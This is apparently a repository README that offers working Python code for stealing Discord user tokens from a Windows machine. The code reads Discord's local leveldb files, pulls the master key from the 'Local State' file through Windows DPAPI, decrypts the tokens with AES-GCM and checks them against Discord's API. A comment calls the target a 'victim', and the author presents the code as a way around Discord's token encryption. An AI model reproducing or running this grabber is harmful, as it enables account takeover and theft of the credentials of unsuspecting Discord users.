# Token-encryption-writeup
All the info's about token encryption in one repository


So, as we all know, Discord recently started encrypting User-tokens. I had them decrypted in under a day but kept it secret. Now that they termed me once again, here we are. I'll publish the exact changes, new regex & decryption.

----------------------------------------------------------------------------------------------------
So, Discords new Token encryption is based off of the "Electron SafeStorage API". If you heard of that before, you can literally just leave now as u know how to decrypt the new tokens lol. If not, heres the new stuff:

```py
import requests
import os
import json 
import base64
from re import findall
from Cryptodome.Cipher import AES # New import 1, AES / also works with from Crypto.Cipher import AES, remember crypto and cryptodrome are pretty same module
from win32crypt import CryptUnprotectData # New import 2, win32crypt

appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}" # new token regex tbw
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # encrypted token regex


def getheaders(token=None, content_type="application/json"): # simply getting our headers for token validation
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36" # one of the last agents just in case discord wants to break balls
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def decrypt_payload(cipher, payload): # decrypting our payload, in this case tokens
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv): # getting an AES Cipher
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key): # decrypting the password, or in this case token with our masterkey & buff
    try:
        iv = buff[3:15] # getting the IV
        payload = buff[15:] # the encrypted token
        cipher = generate_cipher(master_key, iv) # our cipher
        decrypted_pass = decrypt_payload(cipher, payload) # decryping that shit
        decrypted_pass = decrypted_pass[:-16].decode() # and splitting away stuff nobody asked for
        return decrypted_pass # boom
    except:
        return "ratio"

def get_token_key(path): # token encryption uses a key stored in a different folder, lets get it, shall we? :)
    with open(path, "r", encoding="utf-8") as f: # opening the key file
        local_state = f.read() # reading our file
    local_state = json.loads(local_state) # and thats our local_state value

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) # now we want our key
    master_key = master_key[5:] # which we will eventually get after splitting off nonesense
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1] # and using win32crypt
    return master_key # boom, key


def grabTokens():
    tokens = []
    paths = {
        'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
}

    for source, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path): # if it is discord...
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
                continue
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
                for y in findall(encrypted_regex, line): # and find our encrypted regex
                    for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs, because all local state files are same for an user, even the discord client is different
                        if os.path.isfile(ROAMING+ f'\\{i}\\Local State'): # to avoid error if victim doesn't hav discordcanary for example (file not found..)
                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
                            if r.status_code == 200:
                                if token in tokens:
                                    continue
                                tokens.append(token)
                                                    

```

Enjoy, kids


Sincerely,
CC/CL
